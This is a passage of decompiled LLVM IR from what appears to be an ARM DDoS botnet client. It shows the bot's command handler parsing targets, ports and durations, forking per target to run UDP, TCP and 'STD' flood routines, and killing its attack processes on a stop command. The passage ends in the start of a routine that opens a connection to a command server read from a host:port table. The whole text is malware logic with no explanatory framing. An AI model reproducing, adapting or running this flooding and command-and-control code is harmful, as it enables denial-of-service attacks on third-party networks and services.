  br i1 %v3_10005f3c, label %dec_label_pc_10005f44, label %dec_label_pc_10005f70

dec_label_pc_10005f44:                            ; preds = %dec_label_pc_10005f34
  store i32 %storemerge6, i32* @r10, align 4
  %v7_10005f64 = call i32 @sendUDP(i32 %storemerge1530, i32 %v2_10005de4, i32 %v2_10005e00, i32 %v2_10005e1c, i32 %v2_10005e38, i32 %storemerge816, i32 %storemerge7)
  %v1_10005f6c = call i32 @__GI__exit(i32 0)
  br label %dec_label_pc_10005f70

dec_label_pc_10005f70:                            ; preds = %dec_label_pc_10005f34, %dec_label_pc_10005f44
  store i32 ptrtoint (i32* @global_var_10011384.200 to i32), i32* @r4, align 4
  store i32 268459904, i32* @lr, align 4
  %v4_10005f7c = call i32 @__GI_strtok(i32 0, i32 ptrtoint (i32* @global_var_10011384.200 to i32), i32 ptrtoint ([31 x i8]* @global_var_10010000.5 to i32))
  %v3_10005f8c = icmp eq i32 %v4_10005f7c, 0
  br i1 %v3_10005f8c, label %dec_label_pc_10006544, label %dec_label_pc_10005f34

dec_label_pc_10005f98:                            ; preds = %dec_label_pc_10005ef0
  store i32 268459932, i32* @lr, align 4
  %v0_10005f98 = call i32 @listFork()
  %v3_10005fa0 = icmp eq i32 %v0_10005f98, 0
  br i1 %v3_10005fa0, label %dec_label_pc_10005fa8, label %dec_label_pc_10006544

dec_label_pc_10005fa8:                            ; preds = %dec_label_pc_10005f98
  store i32 %storemerge6, i32* @r10, align 4
  %v7_10005fc8 = call i32 @sendUDP(i32 %v2_10005dcc, i32 %v2_10005de4, i32 %v2_10005e00, i32 %v2_10005e1c, i32 %v2_10005e38, i32 %storemerge816, i32 %storemerge7)
  %v1_10005fd0 = call i32 @__GI__exit(i32 0)
  br label %dec_label_pc_10005fd4

dec_label_pc_10005fd4:                            ; preds = %dec_label_pc_10005c68, %dec_label_pc_10005fa8
  %v2_10005fd8 = load i32, i32* %arg2, align 4
  store i32 ptrtoint ([4 x i8]* @global_var_100113e8.219 to i32), i32* @r4, align 4
  %v3_10005fe8 = inttoptr i32 %v2_10005fd8 to i8*
  %v4_10005fe8 = call i32 @__GI_strcoll(i8* %v3_10005fe8, i32 ptrtoint ([4 x i8]* @global_var_100113e8.219 to i32))
  %v3_10005ff0 = icmp eq i32 %v4_10005fe8, 0
  br i1 %v3_10005ff0, label %dec_label_pc_10005ff8, label %dec_label_pc_100062a4

dec_label_pc_10005ff8:                            ; preds = %dec_label_pc_10005fd4
  %tmp86 = icmp slt i32 %arg1, 6
  br i1 %tmp86, label %dec_label_pc_10006544, label %dec_label_pc_10006004

dec_label_pc_10006004:                            ; preds = %dec_label_pc_10005ff8
  %v1_10006008 = add i32 %tmp, 12
  %v1_1000600c = inttoptr i32 %v1_10006008 to i32*
  %v2_1000600c = load i32, i32* %v1_1000600c, align 4
  store i32 268460056, i32* @lr, align 4
  %v2_10006014 = call i32 @atol(i32 %v2_1000600c, i32 %v1_10006008)
  %v4_10006020 = icmp eq i32 %v2_10006014, -1
  br i1 %v4_10006020, label %dec_label_pc_10006544, label %dec_label_pc_10006028

dec_label_pc_10006028:                            ; preds = %dec_label_pc_10006004
  %v1_1000602c = add i32 %tmp, 8
  %v1_10006030 = inttoptr i32 %v1_1000602c to i32*
  %v2_10006030 = load i32, i32* %v1_10006030, align 4
  store i32 268460092, i32* @lr, align 4
  %v2_10006038 = call i32 @atol(i32 %v2_10006030, i32 %v1_1000602c)
  %v4_10006044 = icmp eq i32 %v2_10006038, -1
  br i1 %v4_10006044, label %dec_label_pc_10006544, label %dec_label_pc_1000604c

dec_label_pc_1000604c:                            ; preds = %dec_label_pc_10006028
  %v1_10006050 = add i32 %tmp, 16
  %v1_10006054 = inttoptr i32 %v1_10006050 to i32*
  %v2_10006054 = load i32, i32* %v1_10006054, align 4
  store i32 268460128, i32* @lr, align 4
  %v2_1000605c = call i32 @atol(i32 %v2_10006054, i32 %v1_10006050)
  %v4_10006068 = icmp eq i32 %v2_1000605c, -1
  br i1 %v4_10006068, label %dec_label_pc_10006544, label %dec_label_pc_10006070

dec_label_pc_10006070:                            ; preds = %dec_label_pc_1000604c
  %v2_10006078 = load i32, i32* %v1_10006054, align 4
  store i32 268460164, i32* @lr, align 4
  %v2_10006080 = call i32 @atol(i32 %v2_10006078, i32 %v1_10006050)
  %v2_10006088 = icmp sgt i32 %v2_10006080, 32
  br i1 %v2_10006088, label %dec_label_pc_10006544, label %dec_label_pc_10006090

dec_label_pc_10006090:                            ; preds = %dec_label_pc_10006070
  %tmp87 = icmp slt i32 %arg1, 7
  br i1 %tmp87, label %dec_label_pc_100060bc, label %dec_label_pc_1000609c

dec_label_pc_1000609c:                            ; preds = %dec_label_pc_10006090
  %v1_100060a0 = add i32 %tmp, 24
  %v1_100060a4 = inttoptr i32 %v1_100060a0 to i32*
  %v2_100060a4 = load i32, i32* %v1_100060a4, align 4
  store i32 268460208, i32* @lr, align 4
  %v2_100060ac = call i32 @atol(i32 %v2_100060a4, i32 %v1_100060a0)
  %v1_100060b4 = icmp slt i32 %v2_100060ac, 0
  br i1 %v1_100060b4, label %dec_label_pc_10006544, label %dec_label_pc_100060bc

dec_label_pc_100060bc:                            ; preds = %dec_label_pc_1000609c, %dec_label_pc_10006090
  %v3_100060c0 = icmp eq i32 %arg1, 8
  br i1 %v3_100060c0, label %dec_label_pc_100060c8, label %dec_label_pc_100060ec

dec_label_pc_100060c8:                            ; preds = %dec_label_pc_100060bc
  %v1_100060cc = add i32 %tmp, 28
  %v1_100060d0 = inttoptr i32 %v1_100060cc to i32*
  %v2_100060d0 = load i32, i32* %v1_100060d0, align 4
  store i32 268460252, i32* @lr, align 4
  %v2_100060d8 = call i32 @atol(i32 %v2_100060d0, i32 %v1_100060cc)
  %v2_100060e0 = icmp sgt i32 %v2_100060d8, 0
  br i1 %v2_100060e0, label %dec_label_pc_100060ec, label %dec_label_pc_10006544

dec_label_pc_100060ec:                            ; preds = %dec_label_pc_100060bc, %dec_label_pc_100060c8
  %v1_100060f0 = add i32 %tmp, 4
  %v1_100060f4 = inttoptr i32 %v1_100060f0 to i32*
  %v2_100060f4 = load i32, i32* %v1_100060f4, align 4
  %v2_10006104 = load i32, i32* %v1_10006030, align 4
  store i32 268460304, i32* @lr, align 4
  %v2_1000610c = call i32 @atol(i32 %v2_10006104, i32 %v1_1000602c)
  %v2_10006120 = load i32, i32* %v1_1000600c, align 4
  store i32 268460332, i32* @lr, align 4
  %v2_10006128 = call i32 @atol(i32 %v2_10006120, i32 %v1_10006008)
  %v2_1000613c = load i32, i32* %v1_10006054, align 4
  store i32 268460360, i32* @lr, align 4
  %v2_10006144 = call i32 @atol(i32 %v2_1000613c, i32 %v1_10006050)
  %v1_10006154 = add i32 %tmp, 20
  %v1_10006158 = inttoptr i32 %v1_10006154 to i32*
  %v2_10006158 = load i32, i32* %v1_10006158, align 4
  br i1 %v3_100060c0, label %dec_label_pc_1000616c, label %dec_label_pc_10006188

dec_label_pc_1000616c:                            ; preds = %dec_label_pc_100060ec
  %v1_10006170 = add i32 %tmp, 28
  %v1_10006174 = inttoptr i32 %v1_10006170 to i32*
  %v2_10006174 = load i32, i32* %v1_10006174, align 4
  store i32 268460416, i32* @lr, align 4
  %v2_1000617c = call i32 @atol(i32 %v2_10006174, i32 %v1_10006170)
  br label %dec_label_pc_10006190

dec_label_pc_10006188:                            ; preds = %dec_label_pc_100060ec
  br label %dec_label_pc_10006190

dec_label_pc_10006190:                            ; preds = %dec_label_pc_1000616c, %dec_label_pc_10006188
  %storemerge5 = phi i32 [ 10, %dec_label_pc_10006188 ], [ %v2_1000617c, %dec_label_pc_1000616c ]
  br i1 %tmp87, label %dec_label_pc_100061c0, label %dec_label_pc_100061a4

dec_label_pc_100061a4:                            ; preds = %dec_label_pc_10006190
  %v1_100061a8 = add i32 %tmp, 24
  %v1_100061ac = inttoptr i32 %v1_100061a8 to i32*
  %v2_100061ac = load i32, i32* %v1_100061ac, align 4
  store i32 268460472, i32* @lr, align 4
  %v2_100061b4 = call i32 @atol(i32 %v2_100061ac, i32 %v1_100061a8)
  br label %dec_label_pc_100061c8

dec_label_pc_100061c0:                            ; preds = %dec_label_pc_10006190
  br label %dec_label_pc_100061c8

dec_label_pc_100061c8:                            ; preds = %dec_label_pc_100061a4, %dec_label_pc_100061c0
  %storemerge4 = phi i32 [ 0, %dec_label_pc_100061c0 ], [ %v2_100061b4, %dec_label_pc_100061a4 ]
  store i32 %v2_100060f4, i32* @r3, align 4
  store i32 268460512, i32* @lr, align 4
  %v2_100061dc = call i32 @__GI_strchr(i32 %v2_100060f4, i32 44)
  %v3_100061e4 = icmp eq i32 %v2_100061dc, 0
  br i1 %v3_100061e4, label %dec_label_pc_1000626c, label %dec_label_pc_100061ec

dec_label_pc_100061ec:                            ; preds = %dec_label_pc_100061c8
  store i32 ptrtoint (i32* @global_var_10011384.200 to i32), i32* @r4, align 4
  store i32 268460544, i32* @lr, align 4
  %v4_100061fc = call i32 @__GI_strtok(i32 %v2_100060f4, i32 ptrtoint (i32* @global_var_10011384.200 to i32), i32 ptrtoint ([31 x i8]* @global_var_10010000.5 to i32))
  %v3_1000626025 = icmp eq i32 %v4_100061fc, 0
  br i1 %v3_1000626025, label %dec_label_pc_100062a4, label %dec_label_pc_1000620c

dec_label_pc_1000620c:                            ; preds = %dec_label_pc_100061ec, %dec_label_pc_10006244
  %storemerge1326 = phi i32 [ %v4_10006250, %dec_label_pc_10006244 ], [ %v4_100061fc, %dec_label_pc_100061ec ]
  store i32 268460560, i32* @lr, align 4
  %v0_1000620c = call i32 @listFork()
  %v3_10006214 = icmp eq i32 %v0_1000620c, 0
  br i1 %v3_10006214, label %dec_label_pc_1000621c, label %dec_label_pc_10006244

dec_label_pc_1000621c:                            ; preds = %dec_label_pc_1000620c
  %v7_10006238 = call i32 @sendTCP(i32 %storemerge1326, i32 %v2_1000610c, i32 %v2_10006128, i32 %v2_10006144, i32 %v2_10006158, i32 %storemerge4, i32 %storemerge5)
  %v1_10006240 = call i32 @__GI__exit(i32 0)
  br label %dec_label_pc_10006244

dec_label_pc_10006244:                            ; preds = %dec_label_pc_1000620c, %dec_label_pc_1000621c
  store i32 ptrtoint (i32* @global_var_10011384.200 to i32), i32* @r4, align 4
  store i32 268460628, i32* @lr, align 4
  %v4_10006250 = call i32 @__GI_strtok(i32 0, i32 ptrtoint (i32* @global_var_10011384.200 to i32), i32 ptrtoint ([31 x i8]* @global_var_10010000.5 to i32))
  %v3_10006260 = icmp eq i32 %v4_10006250, 0
  br i1 %v3_10006260, label %dec_label_pc_100062a4, label %dec_label_pc_1000620c

dec_label_pc_1000626c:                            ; preds = %dec_label_pc_100061c8
  store i32 268460656, i32* @lr, align 4
  %v0_1000626c = call i32 @listFork()
  %v3_10006274 = icmp eq i32 %v0_1000626c, 0
  br i1 %v3_10006274, label %dec_label_pc_1000627c, label %dec_label_pc_100062a4

dec_label_pc_1000627c:                            ; preds = %dec_label_pc_1000626c
  %v7_10006298 = call i32 @sendTCP(i32 %v2_100060f4, i32 %v2_1000610c, i32 %v2_10006128, i32 %v2_10006144, i32 %v2_10006158, i32 %storemerge4, i32 %storemerge5)
  %v1_100062a0 = call i32 @__GI__exit(i32 0)
  br label %dec_label_pc_100062a4

dec_label_pc_100062a4:                            ; preds = %dec_label_pc_10006244, %dec_label_pc_100061ec, %dec_label_pc_1000626c, %dec_label_pc_10005fd4, %dec_label_pc_1000627c
  %v2_100062a8 = load i32, i32* %arg2, align 4
  store i32 ptrtoint ([4 x i8]* @global_var_100113ec.223 to i32), i32* @r4, align 4
  %v3_100062b8 = inttoptr i32 %v2_100062a8 to i8*
  %v4_100062b8 = call i32 @__GI_strcoll(i8* %v3_100062b8, i32 ptrtoint ([4 x i8]* @global_var_100113ec.223 to i32))
  %v3_100062c0 = icmp eq i32 %v4_100062b8, 0
  br i1 %v3_100062c0, label %dec_label_pc_100062c8, label %dec_label_pc_10006414

dec_label_pc_100062c8:                            ; preds = %dec_label_pc_100062a4
  %tmp88 = icmp slt i32 %arg1, 4
  br i1 %tmp88, label %dec_label_pc_10006544, label %dec_label_pc_100062d4

dec_label_pc_100062d4:                            ; preds = %dec_label_pc_100062c8
  %v1_100062d8 = add i32 %tmp, 8
  %v1_100062dc = inttoptr i32 %v1_100062d8 to i32*
  %v2_100062dc = load i32, i32* %v1_100062dc, align 4
  store i32 268460776, i32* @lr, align 4
  %v2_100062e4 = call i32 @atol(i32 %v2_100062dc, i32 %v1_100062d8)
  %tmp89 = icmp slt i32 %v2_100062e4, 1
  br i1 %tmp89, label %dec_label_pc_10006544, label %dec_label_pc_100062f4

dec_label_pc_100062f4:                            ; preds = %dec_label_pc_100062d4
  %v1_100062f8 = add i32 %tmp, 12
  %v1_100062fc = inttoptr i32 %v1_100062f8 to i32*
  %v2_100062fc = load i32, i32* %v1_100062fc, align 4
  store i32 268460808, i32* @lr, align 4
  %v2_10006304 = call i32 @atol(i32 %v2_100062fc, i32 %v1_100062f8)
  %v2_1000630c = icmp sgt i32 %v2_10006304, 0
  br i1 %v2_1000630c, label %dec_label_pc_10006318, label %dec_label_pc_10006544

dec_label_pc_10006318:                            ; preds = %dec_label_pc_100062f4
  %v1_1000631c = add i32 %tmp, 4
  %v1_10006320 = inttoptr i32 %v1_1000631c to i32*
  %v2_10006320 = load i32, i32* %v1_10006320, align 4
  %v2_10006330 = load i32, i32* %v1_100062dc, align 4
  store i32 268460860, i32* @lr, align 4
  %v2_10006338 = call i32 @atol(i32 %v2_10006330, i32 %v1_100062d8)
  %v2_1000634c = load i32, i32* %v1_100062fc, align 4
  store i32 268460888, i32* @lr, align 4
  %v2_10006354 = call i32 @atol(i32 %v2_1000634c, i32 %v1_100062f8)
  store i32 %v2_10006320, i32* @r3, align 4
  store i32 268460912, i32* @lr, align 4
  %v2_1000636c = call i32 @__GI_strchr(i32 %v2_10006320, i32 44)
  %v3_10006374 = icmp eq i32 %v2_1000636c, 0
  br i1 %v3_10006374, label %dec_label_pc_100063ec, label %dec_label_pc_1000637c

dec_label_pc_1000637c:                            ; preds = %dec_label_pc_10006318
  store i32 ptrtoint (i32* @global_var_10011384.200 to i32), i32* @r4, align 4
  store i32 268460944, i32* @lr, align 4
  %v4_1000638c = call i32 @__GI_strtok(i32 %v2_10006320, i32 ptrtoint (i32* @global_var_10011384.200 to i32), i32 ptrtoint ([31 x i8]* @global_var_10010000.5 to i32))
  %v3_100063e021 = icmp eq i32 %v4_1000638c, 0
  br i1 %v3_100063e021, label %dec_label_pc_10006414, label %dec_label_pc_1000639c

dec_label_pc_1000639c:                            ; preds = %dec_label_pc_1000637c, %dec_label_pc_100063c4
  %storemerge1122 = phi i32 [ %v4_100063d0, %dec_label_pc_100063c4 ], [ %v4_1000638c, %dec_label_pc_1000637c ]
  store i32 268460960, i32* @lr, align 4
  %v0_1000639c = call i32 @listFork()
  %v3_100063a4 = icmp eq i32 %v0_1000639c, 0
  br i1 %v3_100063a4, label %dec_label_pc_100063ac, label %dec_label_pc_100063c4

dec_label_pc_100063ac:                            ; preds = %dec_label_pc_1000639c
  %v3_100063b8 = call i32 @sendSTD(i32 %storemerge1122, i32 %v2_10006338, i32 %v2_10006354)
  %v1_100063c0 = call i32 @__GI__exit(i32 0)
  br label %dec_label_pc_100063c4

dec_label_pc_100063c4:                            ; preds = %dec_label_pc_1000639c, %dec_label_pc_100063ac
  store i32 ptrtoint (i32* @global_var_10011384.200 to i32), i32* @r4, align 4
  store i32 268461012, i32* @lr, align 4
  %v4_100063d0 = call i32 @__GI_strtok(i32 0, i32 ptrtoint (i32* @global_var_10011384.200 to i32), i32 ptrtoint ([31 x i8]* @global_var_10010000.5 to i32))
  %v3_100063e0 = icmp eq i32 %v4_100063d0, 0
  br i1 %v3_100063e0, label %dec_label_pc_10006414, label %dec_label_pc_1000639c

dec_label_pc_100063ec:                            ; preds = %dec_label_pc_10006318
  store i32 268461040, i32* @lr, align 4
  %v0_100063ec = call i32 @listFork()
  %v3_100063f4 = icmp eq i32 %v0_100063ec, 0
  br i1 %v3_100063f4, label %dec_label_pc_100063fc, label %dec_label_pc_10006544

dec_label_pc_100063fc:                            ; preds = %dec_label_pc_100063ec
  %v3_10006408 = call i32 @sendSTD(i32 %v2_10006320, i32 %v2_10006338, i32 %v2_10006354)
  %v1_10006410 = call i32 @__GI__exit(i32 0)
  br label %dec_label_pc_10006414

dec_label_pc_10006414:                            ; preds = %dec_label_pc_100063c4, %dec_label_pc_1000637c, %dec_label_pc_100062a4, %dec_label_pc_100063fc
  %v2_10006418 = load i32, i32* %arg2, align 4
  store i32 ptrtoint ([5 x i8]* @global_var_100113f0.227 to i32), i32* @r4, align 4
  %v3_10006428 = inttoptr i32 %v2_10006418 to i8*
  %v4_10006428 = call i32 @__GI_strcoll(i8* %v3_10006428, i32 ptrtoint ([5 x i8]* @global_var_100113f0.227 to i32))
  %v3_10006430 = icmp eq i32 %v4_10006428, 0
  br i1 %v3_10006430, label %dec_label_pc_10006438, label %dec_label_pc_10006544

dec_label_pc_10006438:                            ; preds = %dec_label_pc_10006414
  br label %dec_label_pc_100064dc

dec_label_pc_1000644c:                            ; preds = %dec_label_pc_100064dc, %dec_label_pc_10006524
  %v1_10006450 = mul i32 %storemerge9, 4
  %v3_1000645c = load i32, i32* @global_var_10023544.44, align 4
  %v2_10006460 = add i32 %v3_1000645c, %v1_10006450
  %v1_10006464 = inttoptr i32 %v2_10006460 to i32*
  %v2_10006464 = load i32, i32* %v1_10006464, align 4
  %v3_10006468 = icmp eq i32 %v2_10006464, 0
  br i1 %v3_10006468, label %dec_label_pc_100064d0, label %dec_label_pc_10006470

dec_label_pc_10006470:                            ; preds = %dec_label_pc_1000644c
  %v2_10006488 = load i32, i32* %v1_10006464, align 4
  store i32 268461200, i32* @lr, align 4
  %v0_1000648c = call i32 @__libc_getpid()
  %v4_10006494 = icmp eq i32 %v2_10006488, %v0_1000648c
  br i1 %v4_10006494, label %dec_label_pc_100064d0, label %dec_label_pc_1000649c

dec_label_pc_1000649c:                            ; preds = %dec_label_pc_10006470
  %v3_100064ac = load i32, i32* @global_var_10023544.44, align 4
  %v2_100064b0 = add i32 %v3_100064ac, %v1_10006450
  %v1_100064b4 = inttoptr i32 %v2_100064b0 to i32*
  %v2_100064b4 = load i32, i32* %v1_100064b4, align 4
  store i32 268461252, i32* @lr, align 4
  %v2_100064c0 = call i32 @kill(i32 %v2_100064b4, i32 9)
  %v1_100064c8 = add i32 %stack_var_-196.1, 1
  br label %dec_label_pc_100064d0

dec_label_pc_100064d0:                            ; preds = %dec_label_pc_10006470, %dec_label_pc_1000644c, %dec_label_pc_1000649c
  %v0_1000656c32 = phi i32 [ %v0_1000656c33, %dec_label_pc_1000644c ], [ %v0_1000648c, %dec_label_pc_10006470 ], [ %v2_100064c0, %dec_label_pc_1000649c ]
  %stack_var_-196.0 = phi i32 [ %stack_var_-196.1, %dec_label_pc_1000644c ], [ %stack_var_-196.1, %dec_label_pc_10006470 ], [ %v1_100064c8, %dec_label_pc_1000649c ]
  %v1_100064d4 = add i32 %storemerge9, 1
  br label %dec_label_pc_100064dc

dec_label_pc_100064dc:                            ; preds = %dec_label_pc_10006438, %dec_label_pc_100064d0
  %v0_1000656c33 = phi i32 [ 0, %dec_label_pc_10006438 ], [ %v0_1000656c32, %dec_label_pc_100064d0 ]
  %stack_var_-196.1 = phi i32 [ 0, %dec_label_pc_10006438 ], [ %stack_var_-196.0, %dec_label_pc_100064d0 ]
  %storemerge9 = phi i32 [ 0, %dec_label_pc_10006438 ], [ %v1_100064d4, %dec_label_pc_100064d0 ]
  %v2_10006504 = load i32, i32* @global_var_10023518.42, align 4
  %v3_1000651c = icmp eq i32 %v2_10006504, 0
  br i1 %v3_1000651c, label %dec_label_pc_10006524, label %dec_label_pc_1000644c

dec_label_pc_10006524:                            ; preds = %dec_label_pc_100064dc
  %v3_10006508 = load i32, i32* @global_var_1002351c.43, align 4
  %v3_1000653c = icmp ugt i32 %v3_10006508, %storemerge9
  br i1 %v3_1000653c, label %dec_label_pc_1000644c, label %dec_label_pc_10006544

dec_label_pc_10006544:                            ; preds = %dec_label_pc_10005f70, %dec_label_pc_10006524, %dec_label_pc_10005f14, %dec_label_pc_100062f4, %dec_label_pc_100060c8, %dec_label_pc_10005da0, %dec_label_pc_10005b20, %dec_label_pc_100063ec, %dec_label_pc_10006414, %dec_label_pc_10005f98, %dec_label_pc_10005b44, %dec_label_pc_10005a64, %dec_label_pc_100062d4, %dec_label_pc_100062c8, %entry, %dec_label_pc_1000609c, %dec_label_pc_10006070, %dec_label_pc_1000604c, %dec_label_pc_10006028, %dec_label_pc_10006004, %dec_label_pc_10005ff8, %dec_label_pc_10005d74, %dec_label_pc_10005d4c, %dec_label_pc_10005d28, %dec_label_pc_10005d04, %dec_label_pc_10005ce0, %dec_label_pc_10005cbc, %dec_label_pc_10005c98, %dec_label_pc_10005c8c, %dec_label_pc_10005b00, %dec_label_pc_10005af4, %dec_label_pc_10005a0c, %dec_label_pc_10005a9c
  %v0_1000656c = phi i32 [ %v2_10006304, %dec_label_pc_100062f4 ], [ %v2_100060d8, %dec_label_pc_100060c8 ], [ %v2_10005db0, %dec_label_pc_10005da0 ], [ %v2_10005b30, %dec_label_pc_10005b20 ], [ %v0_100063ec, %dec_label_pc_100063ec ], [ %v4_10006428, %dec_label_pc_10006414 ], [ %v0_10005f98, %dec_label_pc_10005f98 ], [ %v0_10005b44, %dec_label_pc_10005b44 ], [ 0, %dec_label_pc_10005a64 ], [ %v2_100062e4, %dec_label_pc_100062d4 ], [ 0, %dec_label_pc_100062c8 ], [ 0, %entry ], [ %v2_100060ac, %dec_label_pc_1000609c ], [ %v2_10006080, %dec_label_pc_10006070 ], [ -1, %dec_label_pc_1000604c ], [ -1, %dec_label_pc_10006028 ], [ -1, %dec_label_pc_10006004 ], [ 0, %dec_label_pc_10005ff8 ], [ %v2_10005d84, %dec_label_pc_10005d74 ], [ %v2_10005d5c, %dec_label_pc_10005d4c ], [ %v2_10005d38, %dec_label_pc_10005d28 ], [ -1, %dec_label_pc_10005d04 ], [ -1, %dec_label_pc_10005ce0 ], [ -1, %dec_label_pc_10005cbc ], [ -1, %dec_label_pc_10005c98 ], [ 0, %dec_label_pc_10005c8c ], [ %v2_10005b10, %dec_label_pc_10005b00 ], [ 0, %dec_label_pc_10005af4 ], [ 0, %dec_label_pc_10005a0c ], [ %v0_10005a74, %dec_label_pc_10005a9c ], [ 0, %dec_label_pc_10005f14 ], [ %v0_1000656c33, %dec_label_pc_10006524 ], [ 0, %dec_label_pc_10005f70 ]
  ret i32 %v0_1000656c

; uselistorder directives
  uselistorder i32 %storemerge9, { 1, 0, 2 }
  uselistorder i32 %stack_var_-196.1, { 0, 2, 1 }
  uselistorder i32 %v1_10006450, { 1, 0 }
  uselistorder i32 %v4_100063d0, { 1, 0 }
  uselistorder i32 %v2_10006354, { 1, 0 }
  uselistorder i32 %v2_10006338, { 1, 0 }
  uselistorder i32 %v2_10006320, { 1, 0, 3, 2 }
  uselistorder i32 %v4_10006250, { 1, 0 }
  uselistorder i32 %storemerge4, { 1, 0 }
  uselistorder i32 %storemerge5, { 1, 0 }
  uselistorder i32 %v2_10006158, { 1, 0 }
  uselistorder i32 %v2_10006144, { 1, 0 }
  uselistorder i32 %v2_10006128, { 1, 0 }
  uselistorder i32 %v2_1000610c, { 1, 0 }
  uselistorder i32 %v2_100060f4, { 1, 0, 3, 2 }
  uselistorder i32 %v4_10005f7c, { 1, 0 }
  uselistorder i32 %storemerge6, { 1, 0 }
  uselistorder i32 %storemerge7, { 1, 0 }
  uselistorder i32 %storemerge816, { 1, 0 }
  uselistorder i32 %v2_10005e60, { 1, 0 }
  uselistorder i32 %v2_10005e38, { 1, 0 }
  uselistorder i32 %v2_10005e1c, { 1, 0 }
  uselistorder i32 %v2_10005e00, { 1, 0 }
  uselistorder i32 %v2_10005de4, { 1, 0 }
  uselistorder i32 %v2_10005dcc, { 1, 0, 3, 2 }
  uselistorder i32 %tmp, { 5, 6, 7, 4, 8, 9, 10, 11, 3, 12, 13, 14, 2, 1, 0, 15, 16, 17, 18, 19, 20, 21, 23, 22, 24, 25, 26 }
  uselistorder i32 (i32, i32, i32)* @sendSTD, { 1, 0 }
  uselistorder i32 (i32, i32, i32, i32, i32, i32, i32)* @sendTCP, { 1, 0 }
  uselistorder i32 (i32, i32, i32, i32, i32, i32, i32)* @sendUDP, { 1, 0 }
  uselistorder i32 ptrtoint (i32* @global_var_10011384.200 to i32), { 1, 8, 2, 9, 0, 10, 3, 11, 4, 12, 5, 13, 6, 14, 7, 15 }
  uselistorder label %dec_label_pc_10006544, { 1, 8, 7, 3, 12, 13, 4, 15, 16, 17, 18, 19, 20, 9, 0, 2, 5, 21, 22, 23, 24, 25, 26, 27, 28, 10, 6, 29, 30, 32, 11, 31, 14 }
  uselistorder label %dec_label_pc_100064dc, { 1, 0 }
  uselistorder label %dec_label_pc_100064d0, { 2, 0, 1 }
  uselistorder label %dec_label_pc_1000644c, { 1, 0 }
  uselistorder label %dec_label_pc_10006414, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_100063c4, { 1, 0 }
  uselistorder label %dec_label_pc_1000639c, { 1, 0 }
  uselistorder label %dec_label_pc_100062a4, { 4, 2, 0, 1, 3 }
  uselistorder label %dec_label_pc_10006244, { 1, 0 }
  uselistorder label %dec_label_pc_1000620c, { 1, 0 }
  uselistorder label %dec_label_pc_100061c8, { 1, 0 }
  uselistorder label %dec_label_pc_10006190, { 1, 0 }
  uselistorder label %dec_label_pc_100060ec, { 1, 0 }
  uselistorder label %dec_label_pc_10005fd4, { 1, 0 }
  uselistorder label %dec_label_pc_10005f70, { 1, 0 }
  uselistorder label %dec_label_pc_10005f34, { 1, 0 }
  uselistorder label %dec_label_pc_10005ef0, { 1, 0 }
  uselistorder label %dec_label_pc_10005eb8, { 1, 0 }
  uselistorder label %dec_label_pc_10005ea4, { 1, 0 }
  uselistorder label %dec_label_pc_10005dc4, { 1, 0 }
  uselistorder label %dec_label_pc_10005c68, { 1, 0 }
  uselistorder label %dec_label_pc_10005ad0, { 2, 0, 1 }
  uselistorder label %dec_label_pc_10005a3c, { 1, 0 }
}

define i32 @initConnection() local_unnamed_addr {
entry:
  %stack_var_-4132 = alloca i32, align 4
  %v2_10006584 = ptrtoint i32* %stack_var_-4132 to i32
  store i32 268461468, i32* @lr, align 4
  %v3_10006598 = call i32 @__GI_memset(i32 %v2_10006584, i32 0, i32 4096)
  %v3_100065a0 = load i32, i32* @global_var_10023510.27, align 4
  %v3_100065a4 = icmp eq i32 %v3_100065a0, 0
  br i1 %v3_100065a4, label %dec_label_pc_100065c8, label %dec_label_pc_100065ac

dec_label_pc_100065ac:                            ; preds = %entry
  store i32 268461500, i32* @lr, align 4
  %v1_100065b8 = call i32 @__libc_close(i32 %v3_100065a0)
  store i32 0, i32* @global_var_10023510.27, align 4
  br label %dec_label_pc_100065c8

dec_label_pc_100065c8:                            ; preds = %entry, %dec_label_pc_100065ac
  %v3_100065cc = load i32, i32* @global_var_100234d0.228, align 4
  %v3_100065d0 = icmp eq i32 %v3_100065cc, 0
  br i1 %v3_100065d0, label %dec_label_pc_100065d8, label %dec_label_pc_100065e8

dec_label_pc_100065d8:                            ; preds = %dec_label_pc_100065c8
  br label %dec_label_pc_100065fc

dec_label_pc_100065e8:                            ; preds = %dec_label_pc_100065c8
  %v1_100065f0 = add i32 %v3_100065cc, 1
  br label %dec_label_pc_100065fc

dec_label_pc_100065fc:                            ; preds = %dec_label_pc_100065d8, %dec_label_pc_100065e8
  %storemerge = phi i32 [ 0, %dec_label_pc_100065d8 ], [ %v1_100065f0, %dec_label_pc_100065e8 ]
  store i32 %storemerge, i32* @global_var_100234d0.228, align 4
  %v1_10006610 = mul i32 %storemerge, 4
  %v2_10006614 = add i32 %v1_10006610, ptrtoint ([20 x i8]** @global_var_100234c8.230 to i32)
  %v1_10006618 = inttoptr i32 %v2_10006614 to i32*
  %v2_10006618 = load i32, i32* %v1_10006618, align 4
  %v2_10006624 = inttoptr i32 %v2_10006618 to i8*
  %v3_10006624 = call i32 @strcpy(i32 %v2_10006584, i8* %v2_10006624)
  store i32 %v2_10006584, i32* @r3, align 4
  store i32 268461632, i32* @lr, align 4
  %v2_1000663c = call i32 @__GI_strchr(i32 %v2_10006584, i32 58)
  %v3_10006644 = icmp eq i32 %v2_1000663c, 0
  br i1 %v3_10006644, label %dec_label_pc_10006694, label %dec_label_pc_1000664c

dec_label_pc_1000664c:                            ; preds = %dec_label_pc_100065fc
  store i32 %v2_10006584, i32* @r3, align 4
  store i32 268461660, i32* @lr, align 4
  %v2_10006658 = call i32 @__GI_strchr(i32 %v2_10006584, i32 58)
  %v1_10006660 = add i32 %v2_10006658, 1
  store i32 268461676, i32* @lr, align 4
  %v2_10006668 = call i32 @atol(i32 %v1_10006660, i32 %v2_10006658)
  store i32 %v2_10006584, i32* @r3, align 4
  store i32 268461700, i32* @lr, align 4
  %v2_10006680 = call i32 @__GI_strchr(i32 %v2_10006584, i32 58)
  %v3_10006690 = inttoptr i32 %v2_10006680 to i8*
  store i8 0, i8* %v3_10006690, align 1
  br label %dec_label_pc_10006694

dec_label_pc_10006694:                            ; preds = %dec_label_pc_100065fc, %dec_label_pc_1000664c
  %stack_var_-4136.0 = phi i32 [ 123, %dec_label_pc_100065fc ], [ %v2_10006668, %dec_label_pc_1000664c ]
  store i32 268461732, i32* @lr, align 4
  %v3_100066a0 = call i32 @socket(i32 2, i32 1, i32 0)
  store i32 %v3_100066a0, i32* @global_var_10023510.27, align 4
  store i32 268461776, i32* @lr, align 4
